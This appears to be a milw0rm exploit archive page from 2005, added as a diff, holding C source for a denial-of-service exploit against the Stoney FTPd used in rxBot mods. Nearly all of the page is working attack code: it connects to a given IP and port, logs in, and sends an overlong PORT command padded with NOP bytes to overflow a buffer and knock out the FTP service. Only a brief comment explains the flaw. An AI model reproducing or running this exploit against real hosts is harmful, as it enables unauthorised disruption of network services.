@@ -1,0 +1,135 @@
+<html>
+<head>
+<title>Stoney FTPd Denial Of Service Exploit (rxBot mods ftpd)</title>
+<pre>
+/* untested /str0ke */
+
+/*
+	rx-dos.c by D-oNe	
+
+	There exists a buffer overflow in Stoneys FTPd that most rxBot mod's use.
+	The problem lies in how the code parses the PORT command and gives an opportunity
+	for a buffer overflow.
+	
+	Problem is that the ftpd also uses select() to handle multiple connections. So when
+	sending the crafted PORT command select() returns NULL making it return and exit the
+	FTPd thread resulting merely in a Denial Of Service of the FTPd with no crash of the bot
+	itself.
+
+	Tested with &quot;rxBot reptile 0.37&quot;.
+*/
+
+#pragma comment(lib, &quot;ws2_32&quot;)
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;winsock2.h&gt;
+
+unsigned char user[] =
+	&quot;\x55\x53\x45\x52\x20\x31&quot;;
+
+unsigned char pass[] =
+	&quot;\x50\x41\x53\x53\x20\x31&quot;;
+
+unsigned char overflow[] =
+	&quot;\x50\x4F\x52\x54\x20&quot;
+	&quot;\x31\x2C\x31\x2C\x31\x2C\x31\x2C\x31\x2C\x31&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+	&quot;\x90\x90&quot;;
+
+int main(int argc, char *argv[])
+{
+	char szBuffer[128];
+	struct sockaddr_in sin;
+	SOCKET sock;
+	WSADATA wsadata;
+		printf(&quot;\nrxBot Stoney FTPd Denial Of Service Exploit by D-oNe\n\n&quot;);
+	if (argc &lt; 3) 
+	{
+			printf(&quot;usage: %s &lt;ip&gt; &lt;port&gt;\n&quot;, argv[0]);
+			printf(&quot;[-] Exiting...\n&quot;);
+			return 0;
+	}
+	if (WSAStartup(0x0202, &amp;wsadata) != 0)
+	{
+			printf(&quot;[-] WSAStartup() failed!\n&quot;);
+			return 0;
+	}
+		sin.sin_family = AF_INET;
+		sin.sin_addr.s_addr = inet_addr(argv[1]);
+		sin.sin_port = htons(atoi(argv[2]));
+		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (sock == SOCKET_ERROR)
+	{
+			printf(&quot;[-] socket() failed!\n&quot;);
+			return 0;
+	}
+		printf(&quot;[+] Connecting...\n&quot;);
+	if (connect(sock, (struct sockaddr *)&amp;sin, sizeof(sin)) == SOCKET_ERROR)
+	{
+			printf(&quot;[-] connec()t failed!\n&quot;);
+			return 0;
+	}
+		recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
+	if ((szBuffer[0] != '2') &amp;&amp; (szBuffer[1] != '2') &amp;&amp; (szBuffer[2] != '0'))
+	{
+			printf(&quot;[-] Wrong string received!\n&quot;);
+			return 0;
+	}
+		printf(&quot;[+] Sending USER...\n&quot;);
+	if (!send(sock, user, sizeof(user), 0))
+	{
+			printf(&quot;[-] send() failed!\n&quot;);
+			return 0;
+	}
+		recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
+	if ((szBuffer[0] != '3') &amp;&amp; (szBuffer[1] != '3') &amp;&amp; (szBuffer[2] != '1'))
+	{
+			printf(&quot;[-] Wrong string received!\n&quot;);
+			return 0;
+	}
+		printf(&quot;[+] Sending PASS...\n&quot;);
+	if (!send(sock, pass, sizeof(pass), 0))
+	{
+			printf(&quot;[-] send() failed!\n&quot;);
+			return 0;
+	}
+		recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
+	if ((szBuffer[0] != '2') &amp;&amp; (szBuffer[1] != '3') &amp;&amp; (szBuffer[2] != '0'))
+	{
+			printf(&quot;[-] Wrong string received!\n&quot;);
+			return 0;
+	}
+		printf(&quot;[+] Sending malicious PORT command...\n&quot;);
+	if (!send(sock, overflow, sizeof(overflow), 0))
+	{
+			printf(&quot;[-] send() failed!\n&quot;);
+			return 0;
+	}
+		memset(szBuffer, 0, sizeof(szBuffer));
+		recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
+		szBuffer[strlen(szBuffer) - 1] = '\0';
+		printf(&quot;[+] Recvd: %s\n&quot;, szBuffer);
+		closesocket(sock);
+		WSACleanup();
+		printf(&quot;[+] FTPd should be out of service!\n&quot;, szBuffer);
+		return 0;
+}
+
+// milw0rm.com [2005-09-16]
+</pre>
+</html>
+
